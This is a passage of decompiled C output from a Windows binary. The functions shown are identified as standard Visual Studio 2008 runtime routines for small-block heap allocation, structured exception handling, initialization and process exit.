    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_004196b0 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_0041b40c * 0x8000 + DAT_004196b0[3]),0x8000,0x4000);
        DAT_004196b0[2] = DAT_004196b0[2] | 0x80000000U >> ((byte)DAT_0041b40c & 0x1f);
        *(undefined4 *)(DAT_004196b0[4] + 0xc4 + DAT_0041b40c * 4) = 0;
        *(char *)(DAT_004196b0[4] + 0x43) = *(char *)(DAT_004196b0[4] + 0x43) + -1;
        if (*(char *)(DAT_004196b0[4] + 0x43) == '\0') {
          DAT_004196b0[1] = DAT_004196b0[1] & 0xfffffffe;
        }
        if (DAT_004196b0[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_004196b0[3],0,0x8000);
          HeapFree(DAT_00419558,0,(LPVOID)DAT_004196b0[4]);
          _memmove(DAT_004196b0,DAT_004196b0 + 5,
                   (DAT_0041b3f8 * 0x14 - (int)DAT_004196b0) + -0x14 + DAT_0041b3fc);
          DAT_0041b3f8 = DAT_0041b3f8 + -1;
          if (DAT_004196b0 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_0041b404 = DAT_0041b3fc;
        }
      }
      DAT_004196b0 = param_1;
      DAT_0041b40c = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_0041b3f8 == DAT_0041b408) {
    pvVar1 = HeapReAlloc(DAT_00419558,0,DAT_0041b3fc,(DAT_0041b408 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_0041b408 = DAT_0041b408 + 0x10;
    DAT_0041b3fc = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_0041b3f8 * 0x14 + (int)DAT_0041b3fc);
  pvVar1 = HeapAlloc(DAT_00419558,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_0041b3f8 = DAT_0041b3f8 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_00419558,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_0041b3fc + DAT_0041b3f8 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_0041b404;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_0041b3fc;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_0041b404 && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_0041b404) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_0041b3fc;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_0041b404 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_0041b404) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_0041b404 = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0040acb2;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0040acb2:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_004196b0)) && (local_8 == DAT_0041b40c)) {
    DAT_004196b0 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00418df8 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00418df8);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_0040ae08;
        }
        if (0 < iVar2) {
          if ((*param_1 == -0x1f928c9d) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_00416768)
             , BVar3 != 0)) {
            ___DestructExceptionObject(param_1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00418df8);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_0040aecc;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_0040aecc:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00418df8);
  }
LAB_0040ae08:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_004183f8);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040af88(void)

{
  __lock(8);
  return;
}



void FUN_0040af91(void)

{
  FUN_0040a124(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  if (DAT_0041b3f0 != (code *)0x0) {
    BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041b3f0);
    if (BVar1 != 0) {
      (*DAT_0041b3f0)(param_1);
    }
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_00414184,(undefined **)&DAT_0041419c);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0040d6b8);
    __initterm((undefined **)&DAT_00414180);
    if (DAT_0041b3f4 != (code *)0x0) {
      BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041b3f4);
      if (BVar1 != 0) {
        (*DAT_0041b3f4)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040b180)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_004196e4 != 1) {
    _DAT_004196e0 = 1;
    DAT_004196dc = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_0041b3e8);
      if (piVar1 != (int *)0x0) {
